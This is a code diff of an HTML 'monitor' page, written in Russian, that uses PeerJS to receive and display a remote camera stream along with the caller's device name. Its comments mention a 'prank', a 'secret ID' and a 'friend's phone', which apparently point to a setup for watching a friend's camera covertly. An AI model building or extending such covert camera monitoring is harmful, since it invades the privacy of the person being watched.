@@ -2,26 +2,50 @@
 <html>
 <head>
     <title>Монитор</title>
+    <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 </head>
-<body style="background: #222; color: white; text-align: center;">
-    <h2>Ожидание подключения друга...</h2>
-    <video id="remoteVideo" autoplay playsinline muted controls style="width: 100%; max-width: 600px; border: 2px solid red;"></video>
+<body style="background: #222; color: white; text-align: center; font-family: sans-serif; padding-top: 20px;">
+
+    <h2 id="status">Ожидание подключения...</h2>
+    <p id="device-info" style="color: #00ff00; font-size: 22px; font-weight: bold; margin-bottom: 10px;"></p>
+    
+    <video id="remoteVideo" autoplay playsinline muted controls style="width: 95%; max-width: 700px; border: 4px solid #ff0050; border-radius: 15px; background: black;"></video>
+    
+    <p style="color: #aaa; margin-top: 15px;">Если видео не появилось — нажми пальцем на экран или на кнопку Play</p>
 
     <script>
-        // ВПИШИ ТОТ ЖЕ ID, ЧТО И В ПЕРВОМ ФАЙЛЕ
-        const peer = new Peer('super-tiktok-prank-2026'); 
+        // ТВОЙ СЕКРЕТНЫЙ ID
+        const MY_ID = '09062012';
+
+        const peer = new Peer(MY_ID);
+
+        peer.on('open', (id) => {
+            console.log('Панель готова. ID: ' + id);
+        });
 
         peer.on('call', call => {
-            call.answer(); // Отвечаем на звонок без передачи своей камеры
+            // Получаем название телефона друга
+            const device = call.metadata && call.metadata.device ? call.metadata.device : "Устройство...";
+            document.getElementById('device-info').innerText = "ПОДКЛЮЧЕНО: " + device;
+            document.getElementById('status').innerText = "ТРАНСЛЯЦИЯ ИДЕТ";
+
+            call.answer(); 
+            
             call.on('stream', remoteStream => {
-                document.getElementById('remoteVideo').srcObject = remoteStream;
-                document.querySelector('h2').innerText = "СВЯЗЬ УСТАНОВЛЕНА!";
+                const video = document.getElementById('remoteVideo');
+                video.srcObject = remoteStream;
+                
+                // Пробуем запустить видео принудительно
+                video.play().catch(e => {
+                    console.log("Ждем клика пользователя для запуска");
+                });
             });
+        });
+
+        peer.on('error', err => {
+            alert('Ошибка связи: ' + err.type);
         });
     </script>
 </body>
-
 </html>
-
-
